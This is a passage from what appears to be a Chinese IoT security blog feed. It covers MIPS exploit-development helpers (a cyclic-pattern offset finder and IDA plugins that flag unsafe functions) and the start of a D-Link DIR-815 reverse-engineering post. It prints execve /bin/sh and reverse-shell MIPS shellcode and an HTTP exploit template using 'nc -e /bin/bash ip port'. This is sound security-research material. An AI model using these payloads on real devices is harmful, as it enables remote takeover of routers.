        codeStr <span class="token operator">+=</span> a<span class="token punctuation">[</span>i<span class="token operator">/</span><span class="token punctuation">(</span><span class="token number">26</span><span class="token operator">*</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">+</span>b<span class="token punctuation">[</span><span class="token punctuation">(</span>i<span class="token operator">%</span><span class="token punctuation">(</span><span class="token number">26</span><span class="token operator">*</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token operator">+</span>c<span class="token punctuation">[</span>i<span class="token operator">%</span><span class="token punctuation">(</span><span class="token number">26</span><span class="token operator">*</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">10</span><span class="token punctuation">]</span>
    <span class="token keyword">print</span> <span class="token string">'ok!'</span>
    <span class="token keyword">if</span> output<span class="token punctuation">:</span>
        <span class="token keyword">print</span> <span class="token string">'[+] output to %s'</span><span class="token operator">%</span>output<span class="token punctuation">,</span>
        fw <span class="token operator">=</span> open<span class="token punctuation">(</span>output<span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span>
        fw<span class="token punctuation">.</span>write<span class="token punctuation">(</span>codeStr<span class="token punctuation">)</span>
        fw<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span> <span class="token string">'ok!'</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> codeStr
    <span class="token keyword">print</span> <span class="token string">"[+] take time: %.4f s"</span><span class="token operator">%</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span>timeStart<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">patternMatch</span><span class="token punctuation">(</span>searchCode<span class="token punctuation">,</span> length<span class="token operator">=</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment" spellcheck="true">#</span>
    <span class="token comment" spellcheck="true"># pattern search</span>
    offset <span class="token operator">=</span> <span class="token number">0</span>
    pattern <span class="token operator">=</span> None

    timeStart <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
    is0xHex <span class="token operator">=</span> re<span class="token punctuation">.</span>match<span class="token punctuation">(</span><span class="token string">'^0x[0-9a-fA-F]{8}'</span><span class="token punctuation">,</span>searchCode<span class="token punctuation">)</span>
    isHex <span class="token operator">=</span> re<span class="token punctuation">.</span>match<span class="token punctuation">(</span><span class="token string">'^[0-9a-fA-F]{8}'</span><span class="token punctuation">,</span>searchCode<span class="token punctuation">)</span>

    <span class="token keyword">if</span> is0xHex<span class="token punctuation">:</span>
        <span class="token comment" spellcheck="true">#0x41613141</span>
        pattern <span class="token operator">=</span> binascii<span class="token punctuation">.</span>a2b_hex<span class="token punctuation">(</span>searchCode<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">elif</span> isHex<span class="token punctuation">:</span>
        <span class="token comment" spellcheck="true">#41613141</span>
        pattern <span class="token operator">=</span> binascii<span class="token punctuation">.</span>a2b_hex<span class="token punctuation">(</span>searchCode<span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span> <span class="token string">'[-] seach Pattern eg:0x41613141'</span>
        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>

    source <span class="token operator">=</span> generate<span class="token punctuation">(</span>length<span class="token punctuation">,</span>None<span class="token punctuation">)</span>
    offset <span class="token operator">=</span> source<span class="token punctuation">.</span>find<span class="token punctuation">(</span>pattern<span class="token punctuation">)</span>

    <span class="token keyword">if</span> offset <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span> <span class="token string">"[*] Exact match at offset %d"</span><span class="token operator">%</span>offset
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span> <span class="token string">"[*] No exact matches, looking for likely candidates..."</span>
        reverse <span class="token operator">=</span> list<span class="token punctuation">(</span>pattern<span class="token punctuation">)</span>
        reverse<span class="token punctuation">.</span>reverse<span class="token punctuation">(</span><span class="token punctuation">)</span>
        pattern <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>reverse<span class="token punctuation">)</span>
        offset <span class="token operator">=</span> source<span class="token punctuation">.</span>find<span class="token punctuation">(</span>pattern<span class="token punctuation">)</span>
        <span class="token keyword">if</span> offset <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span> <span class="token string">"[+] Possible match at offset %d (adjusted another-endian)"</span><span class="token operator">%</span>offset
    <span class="token keyword">print</span> <span class="token string">"[+] take time: %.4f s"</span><span class="token operator">%</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span>timeStart<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment" spellcheck="true">## parse argument</span>
    parser <span class="token operator">=</span> argparse<span class="token punctuation">.</span>ArgumentParser<span class="token punctuation">(</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'-s'</span><span class="token punctuation">,</span> <span class="token string">'--search'</span><span class="token punctuation">,</span> help<span class="token operator">=</span><span class="token string">'search for pattern'</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'-c'</span><span class="token punctuation">,</span> <span class="token string">'--create'</span><span class="token punctuation">,</span> help<span class="token operator">=</span><span class="token string">'create a pattern'</span><span class="token punctuation">,</span>\
                        action<span class="token operator">=</span><span class="token string">'store_true'</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'-f'</span><span class="token punctuation">,</span> <span class="token string">'--file'</span><span class="token punctuation">,</span> help<span class="token operator">=</span><span class="token string">'output file name'</span><span class="token punctuation">,</span>\
                        default<span class="token operator">=</span><span class="token string">'patternShell.txt'</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'-l'</span><span class="token punctuation">,</span> <span class="token string">'--length'</span><span class="token punctuation">,</span>help<span class="token operator">=</span><span class="token string">'length of pattern code'</span><span class="token punctuation">,</span>\
                        type<span class="token operator">=</span>int<span class="token punctuation">,</span>default<span class="token operator">=</span><span class="token number">1024</span><span class="token punctuation">)</span>
    <span class="token comment" spellcheck="true">#parser.add_argument('-v', dest='verbose', action='store_true')</span>
    args <span class="token operator">=</span> parser<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token comment" spellcheck="true">## save all argument</span>
    length <span class="token operator">=</span> args<span class="token punctuation">.</span>length
    output <span class="token operator">=</span> args<span class="token punctuation">.</span>file
    <span class="token comment" spellcheck="true">#verbose = args.verbose</span>
    createCode <span class="token operator">=</span> args<span class="token punctuation">.</span>create
    searchCode <span class="token operator">=</span> args<span class="token punctuation">.</span>search

    <span class="token keyword">if</span> createCode <span class="token operator">and</span> <span class="token punctuation">(</span><span class="token number">0</span> <span class="token operator">&lt;</span> args<span class="token punctuation">.</span>length <span class="token operator">&lt;=</span> <span class="token number">26</span><span class="token operator">*</span><span class="token number">26</span><span class="token operator">*</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token comment" spellcheck="true">#eg:  -c -l 90</span>
        generate<span class="token punctuation">(</span>length<span class="token punctuation">,</span>output<span class="token punctuation">)</span>
    <span class="token keyword">elif</span> searchCode <span class="token operator">and</span> <span class="token punctuation">(</span><span class="token number">0</span> <span class="token operator">&lt;</span> args<span class="token punctuation">.</span>length <span class="token operator">&lt;=</span> <span class="token number">26</span><span class="token operator">*</span><span class="token number">26</span><span class="token operator">*</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token comment" spellcheck="true">#eg: -s 0x474230141</span>
        patternMatch<span class="token punctuation">(</span>searchCode<span class="token punctuation">,</span>length<span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span> <span class="token string">'[-] You shoud chices from [-c -s]'</span>
        <span class="token keyword">print</span> <span class="token string">'[-] Pattern length must be less than 6760'</span>
        <span class="token keyword">print</span> <span class="token string">'more help: pattern.py -h'</span>
    <span class="token comment" spellcheck="true"># ...</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<h1 id="IDA插件"><a href="#IDA插件" class="headerlink" title="IDA插件"></a>IDA插件</h1><p>##　scanvuln.py</p>
<p>脚本使用：将脚本放置IDA的plugins文件下，在命令行输入scanvuln.find(‘xxx’)查找xxx函数</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> idaapi <span class="token keyword">import</span> <span class="token operator">*</span>

<span class="token keyword">class</span> <span class="token class-name">scanvulnfinder</span><span class="token punctuation">(</span>idaapi<span class="token punctuation">.</span>plugin_t<span class="token punctuation">)</span><span class="token punctuation">:</span>
    flags <span class="token operator">=</span> <span class="token number">0</span>
    comment <span class="token operator">=</span> <span class="token string">"MIPS vuln Funcs Finder"</span>
    help <span class="token operator">=</span> <span class="token string">""</span>
    wanted_name <span class="token operator">=</span> <span class="token string">"MIPS vuln Funcs Finder"</span>
    wanted_hotkey <span class="token operator">=</span> <span class="token string">""</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>init<span class="token punctuation">(</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>run<span class="token punctuation">(</span>None<span class="token punctuation">)</span>
    <span class="token keyword">def</span> <span class="token function">init</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>menu_context <span class="token operator">=</span> idaapi<span class="token punctuation">.</span>add_menu_item<span class="token punctuation">(</span><span class="token string">"Search/"</span><span class="token punctuation">,</span> <span class="token string">"MIPS vulu Funcs Finder"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>run<span class="token punctuation">,</span> <span class="token punctuation">(</span>None<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> idaapi<span class="token punctuation">.</span>PLUGIN_KEEP

    <span class="token keyword">def</span> <span class="token function">term</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        idaapi<span class="token punctuation">.</span>del_menu_item<span class="token punctuation">(</span>self<span class="token punctuation">.</span>menu_context<span class="token punctuation">)</span>
        <span class="token keyword">return</span> None

    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> arg<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">global</span> scanvuln
        scanvuln <span class="token operator">=</span> scanvuln<span class="token punctuation">(</span><span class="token punctuation">)</span>


<span class="token keyword">class</span> <span class="token class-name">scanvuln</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">getFuncAddr</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>fname<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> LocByName<span class="token punctuation">(</span>fname<span class="token punctuation">)</span>
    <span class="token keyword">def</span> <span class="token function">judgeAduit</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>addr<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token triple-quoted-string string">"""
        not safe function handler
        """</span>
        MakeComm<span class="token punctuation">(</span>addr<span class="token punctuation">,</span><span class="token string">"### AUDIT HERE ###"</span><span class="token punctuation">)</span>
        SetColor<span class="token punctuation">(</span>addr<span class="token punctuation">,</span>CIC_ITEM<span class="token punctuation">,</span><span class="token number">0x0000ff</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#set background red</span>

    <span class="token keyword">def</span> <span class="token function">find</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>funcname<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token triple-quoted-string string">"""
        not safe function finder
        """</span>
        count <span class="token operator">=</span><span class="token number">0</span>
        fAddr <span class="token operator">=</span> self<span class="token punctuation">.</span>getFuncAddr<span class="token punctuation">(</span>funcname<span class="token punctuation">)</span>
        func <span class="token operator">=</span> get_func<span class="token punctuation">(</span>fAddr<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token operator">not</span> func <span class="token keyword">is</span> None<span class="token punctuation">:</span>
            fname <span class="token operator">=</span> Name<span class="token punctuation">(</span>func<span class="token punctuation">.</span>startEA<span class="token punctuation">)</span>
            items <span class="token operator">=</span> FuncItems<span class="token punctuation">(</span>func<span class="token punctuation">.</span>startEA<span class="token punctuation">)</span>
            <span class="token keyword">for</span> i <span class="token keyword">in</span> items<span class="token punctuation">:</span>
                <span class="token keyword">for</span> xref <span class="token keyword">in</span> XrefsTo<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                    <span class="token keyword">if</span> xref<span class="token punctuation">.</span>type <span class="token operator">==</span> fl_CN <span class="token operator">or</span> xref<span class="token punctuation">.</span>type <span class="token operator">==</span>fl_CF<span class="token punctuation">:</span>
                        count<span class="token operator">+=</span><span class="token number">1</span>
                        Message<span class="token punctuation">(</span><span class="token string">"|    %s[%d]   calls 0x%08x  from => %08x     |\n"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>fname<span class="token punctuation">,</span>count<span class="token punctuation">,</span>xref<span class="token punctuation">.</span>frm<span class="token punctuation">,</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>
                        self<span class="token punctuation">.</span>judgeAduit<span class="token punctuation">(</span>xref<span class="token punctuation">.</span>frm<span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            Warning<span class="token punctuation">(</span><span class="token string">"NO function named '%s' found at location %x"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>funcname<span class="token punctuation">,</span>fAddr<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">PLUGIN_ENTRY</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> scanvulnfinder<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<h2 id="mipsAudit-py"><a href="#mipsAudit-py" class="headerlink" title="mipsAudit.py"></a>mipsAudit.py</h2><p>MIPS静态汇编审计辅助脚本： <a href="https://github.com/giantbranch/mipsAudit" target="_blank" rel="noopener">https://github.com/giantbranch/mipsAudit</a> </p>
<pre class=" language-c"><code class="language-c">dangerous_functions <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token string">"strcpy"</span><span class="token punctuation">,</span> 
    <span class="token string">"strcat"</span><span class="token punctuation">,</span>  
    <span class="token string">"sprintf"</span><span class="token punctuation">,</span>
    <span class="token string">"read"</span><span class="token punctuation">,</span> 
    <span class="token string">"getenv"</span>    
<span class="token punctuation">]</span>

attention_function <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token string">"memcpy"</span><span class="token punctuation">,</span>
    <span class="token string">"strncpy"</span><span class="token punctuation">,</span>
    <span class="token string">"sscanf"</span><span class="token punctuation">,</span> 
    <span class="token string">"strncat"</span><span class="token punctuation">,</span> 
    <span class="token string">"snprintf"</span><span class="token punctuation">,</span>
    <span class="token string">"vprintf"</span><span class="token punctuation">,</span> 
    <span class="token string">"printf"</span>
<span class="token punctuation">]</span>

command_execution_function <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token string">"system"</span><span class="token punctuation">,</span> 
    <span class="token string">"execve"</span><span class="token punctuation">,</span>
    <span class="token string">"popen"</span><span class="token punctuation">,</span>
    <span class="token string">"unlink"</span>
<span class="token punctuation">]</span></code></pre>
<h1 id="mips-shellcode"><a href="#mips-shellcode" class="headerlink" title="mips shellcode"></a>mips shellcode</h1><p>可以参考以下两个网站：</p>
<p><a href="http://shell-storm.org/shellcode/" target="_blank" rel="noopener">http://shell-storm.org/shellcode/</a><br><a href="https://www.exploit-db.com/exploits/45541" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/45541</a></p>
<p>比较常用的有</p>
<p>执行execve(‘/bin/sh’)</p>
<pre class=" language-sh"><code class="language-sh"># Linux/MIPS - execve /bin/sh - 48 bytes
shellcode = "\xff\xff\x06\x28"   # slti $a2, $zero, -1
shellcode += "\x62\x69\x0f\x3c"  # lui $t7, 0x6962
shellcode += "\x2f\x2f\xef\x35"  # ori $t7, $t7, 0x2f2f
shellcode += "\xf4\xff\xaf\xaf"  # sw $t7, -0xc($sp)
shellcode += "\x73\x68\x0e\x3c"  # lui $t6, 0x6873
shellcode += "\x6e\x2f\xce\x35"  # ori $t6, $t6, 0x2f6e
shellcode += "\xf8\xff\xae\xaf"  # sw $t6, -8($sp)
shellcode += "\xfc\xff\xa0\xaf"  # sw $zero, -4($sp)
shellcode += "\xf4\xff\xa4\x27"  # addiu $a0, $sp, -0xc
shellcode += "\xff\xff\x05\x28"  # slti $a1, $zero, -1
shellcode += "\xab\x0f\x02\x24"  # addiu;$v0, $zero, 0xfab
shellcode += "\x0c\x01\x01\x01"  # syscall 0x40404</code></pre>
<p>反弹shell的<a href="http://shell-storm.org/shellcode/files/shellcode-860.php" target="_blank" rel="noopener">shellcode</a>，需要自己找到IP地址并更改，192.168.1.177其中192.168是连在一起的，对应的十六进制是\xc0\xa8。1.177对应的十六进制是\x01\xb1。</p>
<pre class=" language-sh"><code class="language-sh">#Linux/mips - Reverse Shell Shellcode - 200 bytes
shellcode = ""
shellcode += "\xff\xff\x04\x28\xa6\x0f\x02\x24\x0c\x09\x09\x01\x11\x11\x04\x28"
shellcode += "\xa6\x0f\x02\x24\x0c\x09\x09\x01\xfd\xff\x0c\x24\x27\x20\x80\x01"
shellcode += "\xa6\x0f\x02\x24\x0c\x09\x09\x01\xfd\xff\x0c\x24\x27\x20\x80\x01"
shellcode += "\x27\x28\x80\x01\xff\xff\x06\x28\x57\x10\x02\x24\x0c\x09\x09\x01"
shellcode += "\xff\xff\x44\x30\xc9\x0f\x02\x24\x0c\x09\x09\x01\xc9\x0f\x02\x24"
shellcode += "\x0c\x09\x09\x01\x79\x69\x05\x3c\x01\xff\xa5\x34\x01\x01\xa5\x20"
#shellcode += "\xf8\xff\xa5\xaf\x01\xb1\x05\x3c\xc0\xa8\xa5\x34\xfc\xff\xa5\xaf"#192.168.1.177:31337
shellcode += "\xf8\xff\xa5\xaf\x4f\xb1\x80\x3c\xc0\xa8\xa5\x34\xfc\xff\xa5\xaf"
shellcode += "\xf8\xff\xa5\x23\xef\xff\x0c\x24\x27\x30\x80\x01\x4a\x10\x02\x24"
shellcode += "\x0c\x09\x09\x01\x62\x69\x08\x3c\x2f\x2f\x08\x35\xec\xff\xa8\xaf"
shellcode += "\x73\x68\x08\x3c\x6e\x2f\x08\x35\xf0\xff\xa8\xaf\xff\xff\x07\x28"
shellcode += "\xf4\xff\xa7\xaf\xfc\xff\xa7\xaf\xec\xff\xa4\x23\xec\xff\xa8\x23"
shellcode += "\xf8\xff\xa8\xaf\xf8\xff\xa5\x23\xec\xff\xbd\x27\xff\xff\x06\x28"
shellcode += "\xab\x0f\x02\x24\x0c\x09\x09\x01"</code></pre>
<p>其实为了方便不用修改端口，因为端口31337（0x7a69）更改需要修下面汇编代码中的0x6979和0xFF01。</p>
<pre class=" language-c"><code class="language-c"><span class="token macro property">#Socket FD is already in a0</span>
    #<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>
    <span class="token macro property">#Connect sockaddr</span>
    lui $a1<span class="token punctuation">,</span> <span class="token number">0x6979</span> #Port<span class="token punctuation">:</span>
    ori $a1<span class="token punctuation">,</span> <span class="token number">0xFF01</span> #<span class="token number">31337</span>
    addi $a1<span class="token punctuation">,</span> $a1<span class="token punctuation">,</span> <span class="token number">0x0101</span>
    sw $a1<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token function">8</span><span class="token punctuation">(</span>$sp<span class="token punctuation">)</span>

    li $a1<span class="token punctuation">,</span> <span class="token number">0xB101A8C0</span> #<span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">1.177</span>
    sw $a1<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token function">4</span><span class="token punctuation">(</span>$sp<span class="token punctuation">)</span>
    addi $a1<span class="token punctuation">,</span> $sp<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">8</span></code></pre>
<h1 id="HTTP报文模版"><a href="#HTTP报文模版" class="headerlink" title="HTTP报文模版"></a>HTTP报文模版</h1><pre class=" language-py"><code class="language-py">#!/usr/bin/python2
from pwn import *
import requests
import sys

def getpayload(offset ,libc_base, cmd):
    payload = xxx

    return payload

if _name__=="__main__":

    cmd = 'nc -e /bin/bash ip port'
    cookie = getpayload(offset, libc_base, cmd)

    header = {
        'cookie'        :cookie
        'Content-Type'    :
        'Content-Length':
        'xxxx'            :
    }

    data = {'xxx':'xxxx'}
    ip_port = sys.argv[1]
    url = "http://" + ip_port + "/file"
    r = requests.post( url = url, headers = header, data = data)
    print r.text</code></pre>
<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script>]]></content>
      <categories>
        <category>iot</category>
      </categories>
  </entry>
  <entry>
    <title>D-Link中sobj类函数逆向分析</title>
    <url>/2020/05/19/d-linkzhong-sobj-lei-han-shu-ni-xiang-fen-xi/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>之前调试漏洞的时候都是直接根据官方公告或者别人的帖子直接定位漏洞函数，没有具体分析程序中涉及到的其他也挺重要的函数，这样看起来速度挺快，其实之后还会遇到这些函数，所以还是要仔细分析这些函数。</p>
<p>这次选择了D-Link路由器中的sobj类函数：sobj_new()、sobj_add_char()、sobj_strcmp()、sobj_add_string()、sobj_get_string()等进行分析。</p>
<p>这次分析选择D-Link DIR815固件文件系统中的<code>./htdocs/cgibin</code>，利用qemu的用户模式和IDA\gdb-multiarch联调一步步分析汇编源码，同时结合ghidra反汇编的伪C代码分析。</p>
<p>固件版本：DIR-815 FW 1.01b14_1.01b14.bin</p>
<h1 id="sobj类函数"><a href="#sobj类函数" class="headerlink" title="sobj类函数"></a>sobj类函数</h1><h2 id="sobj-new"><a href="#sobj-new" class="headerlink" title="sobj_new()"></a>sobj_new()</h2><pre class=" language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">sobj_new</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">void</span> <span class="token operator">*</span>malloc_addr<span class="token punctuation">;</span>

  malloc_addr <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>pvVar1 <span class="token operator">!=</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token operator">*</span><span class="token punctuation">(</span>undefined4 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>heap<span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token operator">*</span><span class="token punctuation">(</span>undefined4 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>heap<span class="token operator">+</span> <span class="token number">0xc</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token operator">*</span><span class="token punctuation">(</span>undefined4 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>heap<span class="token operator">+</span> <span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token operator">*</span><span class="token punctuation">(</span>undefined4 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>heap<span class="token operator">+</span> <span class="token number">0x14</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>heap<span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">=</span>malloc_addr <span class="token punctuation">;</span>
    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span>heap<span class="token operator">=</span>malloc_addr <span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>gdb-multiarch联调发现执行完sobj_new之后返回值放在v0中。v0 = 0x42e048</p>
<p><img src="F:%5Cmyblog%5Csource_posts%5CD-Link%C2%96%E4%B8%ADsobj%E7%B1%BB%E5%87%BD%E6%95%B0%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%5Csobj_new().png" alt=""></p>
<p>根据sobj_new函数来看出申请了0x18字节的堆空间作为结构体空间，其偏移0x0,0x4处存放对应分配的首地址。 （根据后续的分析得知：0x14处存放的是<strong>malloc/realloc返回的地址也就是申请存放字符串的堆栈空间</strong>，0x10处存放<strong>当前使用的字节数即进行拷贝过的字节数</strong>，0xc处存放*<em>当前申请的总长度减去1字节(减去的一字节代表空字节) *</em> ）</p>
<h2 id="FUN-0040e864"><a href="#FUN-0040e864" class="headerlink" title="FUN_0040e864()"></a>FUN_0040e864()</h2><p>该函数在sobj_add_char()和sobj_add_string()中有调用，参数是sobj_new()申请的结构体地址。</p>
<pre class=" language-c"><code class="language-c">undefined4 <span class="token function">FUN_0040e864</span><span class="token punctuation">(</span><span class="token keyword">int</span> malloc_addr<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">void</span> <span class="token operator">*</span>pvVar1<span class="token punctuation">;</span>
  <span class="token keyword">int</span> iVar2<span class="token punctuation">;</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span>malloc_addr <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>malloc_addr <span class="token operator">+</span> <span class="token number">0x14</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment" spellcheck="true">//如果0x14处为0</span>
      <span class="token operator">*</span><span class="token punctuation">(</span>undefined4 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>malloc_addr <span class="token operator">+</span> <span class="token number">0xc</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0x20</span><span class="token punctuation">;</span>
      pvVar1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>malloc_addr <span class="token operator">+</span> <span class="token number">0x14</span><span class="token punctuation">)</span> <span class="token operator">=</span> pvVar1<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span> <span class="token punctuation">{</span>
      iVar2 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>malloc_addr <span class="token operator">+</span> <span class="token number">0xc</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
